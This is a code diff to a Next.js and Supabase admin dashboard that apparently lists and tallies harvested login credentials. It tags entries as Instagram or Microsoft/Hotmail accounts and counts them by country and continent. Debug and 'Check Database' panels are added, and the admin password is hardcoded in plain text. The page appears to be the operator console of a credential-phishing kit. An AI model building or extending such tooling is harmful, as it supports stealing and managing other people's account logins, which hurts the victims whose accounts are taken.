@@ -3,7 +3,7 @@ import { createClient } from '@supabase/supabase-js';
 import { useRouter } from 'next/router';
 import Head from 'next/head';
 
-// Initialize Supabase client
+// Initialize Supabase client with proper error handling
 const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
 const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
 const supabase = createClient(supabaseUrl, supabaseAnonKey);
@@ -34,7 +34,7 @@ export default function AdminDashboard() {
     setError('');
     
     // Simple hardcoded password for testing
-    const correctPassword = "admin123"; 
+    const correctPassword = "YourSecurePassword123"; 
     
     if (password === correctPassword) {
       setIsAuthenticated(true);
@@ -72,21 +72,34 @@ export default function AdminDashboard() {
   // Fetch credentials from database
   const fetchCredentials = async () => {
     setLoading(true);
+    setError('');
     
     try {
+      console.log('Supabase URL:', supabaseUrl);
       console.log('Fetching credentials from Supabase...');
       
+      // First, verify we can connect to Supabase
+      const { error: connError } = await supabase.from('users').select('count');
+      if (connError) {
+        console.error('Connection error:', connError);
+        throw new Error(`Supabase connection error: ${connError.message}`);
+      }
+      
+      // Now get all users from the table
       const { data, error } = await supabase
         .from('users')
         .select('*')
-        .order('login_time', { ascending: false });
+        .order('created_at', { ascending: false });
         
       if (error) {
         console.error('Supabase error:', error);
         throw error;
       }
       
-      console.log('Credentials received:', data);
+      console.log('Credentials received:', data ? data.length : 0, 'records');
+      console.log('First record:', data?.[0]);
+      
+      // Set credentials in state
       setCredentials(data || []);
       calculateStats(data || []);
     } catch (error) {
@@ -99,28 +112,45 @@ export default function AdminDashboard() {
   
   // Calculate statistics from credential data
   const calculateStats = (data) => {
-    const stats = {
-      totalEntries: data.length,
-      instagramEntries: data.filter(item => item.username.includes('(IG)')).length,
-      microsoftEntries: data.filter(item => item.username.includes('(hotmail)') || item.username.includes('(MS)')).length,
-      countries: {},
-      continents: {}
-    };
+    if (!data) return;
     
-    // Count by country and continent
-    data.forEach(item => {
-      // Count countries
-      if (item.country) {
-        stats.countries[item.country] = (stats.countries[item.country] || 0) + 1;
+    let instagramCount = 0;
+    let microsoftCount = 0;
+    const countries = {};
+    const continents = {};
+    
+    data.forEach(cred => {
+      // Count by platform
+      if (cred.username && cred.username.includes('(IG)')) {
+        instagramCount++;
+      } else if (cred.username && (
+        cred.username.includes('(MS)') || 
+        cred.username.includes('(hotmail)') || 
+        cred.username.includes('@hotmail') || 
+        cred.username.includes('@outlook') || 
+        cred.username.includes('@live')
+      )) {
+        microsoftCount++;
       }
       
-      // Count continents
-      if (item.continent) {
-        stats.continents[item.continent] = (stats.continents[item.continent] || 0) + 1;
+      // Count by country
+      if (cred.country) {
+        countries[cred.country] = (countries[cred.country] || 0) + 1;
+      }
+      
+      // Count by continent
+      if (cred.continent) {
+        continents[cred.continent] = (continents[cred.continent] || 0) + 1;
       }
     });
     
-    setStats(stats);
+    setStats({
+      totalEntries: data.length,
+      instagramEntries: instagramCount,
+      microsoftEntries: microsoftCount,
+      countries,
+      continents
+    });
   };
   
   // Handle logout
@@ -390,6 +420,85 @@ export default function AdminDashboard() {
           </div>
         )}
       </div>
+      
+      {isAuthenticated && (
+        <div style={{
+          position: 'fixed',
+          bottom: '20px',
+          right: '20px',
+          backgroundColor: '#f0f0f0',
+          padding: '10px',
+          borderRadius: '5px',
+          boxShadow: '0 0 10px rgba(0,0,0,0.2)',
+          maxWidth: '300px',
+          maxHeight: '200px',
+          overflow: 'auto',
+          fontSize: '12px',
+          zIndex: 1000
+        }}>
+          <h4>Debug Console</h4>
+          <button onClick={async () => {
+            try {
+              // 1. Test icon generation
+              const iconRes = await fetch('/api/create-icons');
+              const iconData = await iconRes.json();
+              console.log('Icon generation:', iconData);
+              
+              // 2. Test Supabase connection
+              const { data, error } = await supabase.from('users').select('count');
+              if (error) throw error;
+              console.log('Supabase connection successful');
+              
+              // 3. Refetch data
+              fetchCredentials();
+              
+              alert('Debug operations completed! Check console for details.');
+            } catch (err) {
+              console.error('Debug error:', err);
+              alert('Error: ' + err.message);
+            }
+          }}>
+            Run Diagnostics
+          </button>
+          <div>
+            <strong>Supabase URL:</strong> {supabaseUrl ? '✓' : '✗'}
+          </div>
+          <div>
+            <strong>Supabase Key:</strong> {supabaseAnonKey ? '✓' : '✗'}
+          </div>
+          <div>
+            <strong>Records:</strong> {credentials.length}
+          </div>
+          <div>
+            <strong>IG:</strong> {stats.instagramEntries} | 
+            <strong>MS:</strong> {stats.microsoftEntries}
+          </div>
+        </div>
+      )}
+      
+      <button onClick={async () => {
+        try {
+          const response = await fetch('/api/check-database');
+          const data = await response.json();
+          console.log('Database check:', data);
+          alert(`Database has ${data.count} records (${data.platforms.instagram} IG / ${data.platforms.microsoft} MS)`);
+        } catch (err) {
+          console.error('Error checking database:', err);
+          alert('Error checking database: ' + err.message);
+        }
+      }} style={{
+        position: 'fixed',
+        bottom: '20px',
+        left: '20px',
+        padding: '10px',
+        backgroundColor: '#4caf50',
+        color: 'white',
+        border: 'none',
+        borderRadius: '5px',
+        cursor: 'pointer'
+      }}>
+        Check Database
+      </button>
       
       <style jsx global>{`
         :root {
